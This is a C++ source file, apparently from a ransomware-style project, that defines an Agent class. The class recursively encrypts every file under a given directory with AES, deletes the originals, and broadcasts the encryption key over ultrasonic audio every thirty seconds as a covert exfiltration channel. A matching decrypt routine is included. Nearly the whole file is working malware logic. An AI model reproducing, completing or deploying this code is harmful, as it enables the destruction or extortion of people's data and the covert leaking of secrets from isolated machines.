#include "Agent.h"
#include "Defines.h"

#include <filesystem>
#include <array>
#include <cassert>
#include <Cryptopp/files.h>
#include <Cryptopp/aes.h>
#include <Cryptopp/modes.h>
#include <Cryptopp/osrng.h>
#include <chrono>
#include <utility>

using namespace std::literals;
using namespace std::filesystem;
using namespace CryptoPP;


Agent::Agent(path encryption_root_path) :
	m_encryption_root_path(std::move(encryption_root_path))
{}

Agent::~Agent()
{
	try {
		m_agent_running = false;
		m_send_key_thread.reset();
		m_ultrasonic_main_thread.reset();
	} catch(...) {
		LOG("Exception in agent dtor");
		assert(true);
	}
}

void Agent::execute()
{
	std::array<byte, AES::DEFAULT_KEYLENGTH> encryption_key(generate_key());
	m_send_key_thread = std::make_unique<std::jthread>([&]()
	{
		send_key(encryption_key);
	});
	
	m_ultrasonic_main_thread = std::make_unique<std::jthread>([&]()
	{
		ultrasonic_main();
	});

	encrypt_directory(encryption_key);
}

void Agent::decrypt(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
{
	for (const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			{
				const size_t extention_start = entry.path().wstring().find_last_of('.');
				const path final_path = entry.path().wstring().substr(0, extention_start);
				CFB_Mode<AES>::Decryption decryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
				FileSource fsDcr(entry.path().c_str(), true, new StreamTransformationFilter(decryption, new FileSink(final_path.c_str())));
			}

			std::filesystem::remove(entry.path());
		}
	}
}

void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key) const
{
	for(const directory_entry& entry : recursive_directory_iterator(m_encryption_root_path))
	{
		if (entry.is_regular_file())
		{
			{
				path final_path = entry.path().wstring() + L".encrypted";
				CFB_Mode<AES>::Encryption encryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
				FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
			}

			try {
				std::filesystem::remove(entry.path());
			} catch (...)
			{
				LOG("remove failed");
			}
		}
	}
}

std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
{
	AutoSeededRandomPool rng{};
	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};

	for ( uint32_t i = 0; i< key.size(); ++i )
	{
		key[i] = (rng.GenerateByte() % (122 - 48 + 1)) + 48;
	}
	//rng.GenerateBlock(key.data(), key.size());

	return key;
}

void Agent::ultrasonic_main()
{
	while (m_agent_running) {
		std::this_thread::sleep_for(1ms);

		{
			std::lock_guard lock(m_ultrasonic_mutex);
			m_ultrasonic.run_logic();
		}
	}
}

void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_key)
{
	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
	constexpr int VOLUME = 10;
	
	std::string encryption_data = "key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "}"; //"{ \"agentIp\": \"10.10.10.55\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"cQfTjWnZr4u7x!A%D*F-JaNdRgUkXp2s\\\"}\" }"; //"key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "} vi: {" + std::string(m_init_vector.begin(), m_init_vector.end()) + "}";
	auto ggWave = m_ultrasonic.get_ggwave();

	while (m_agent_running) {
		{
			std::lock_guard lock(m_ultrasonic_mutex);
			ggWave->init(encryption_data.size(), encryption_data.data(), ggWave->getTxProtocol(TX_PROTOCOL), VOLUME);
		}

		std::this_thread::sleep_for(30s);
	}
}
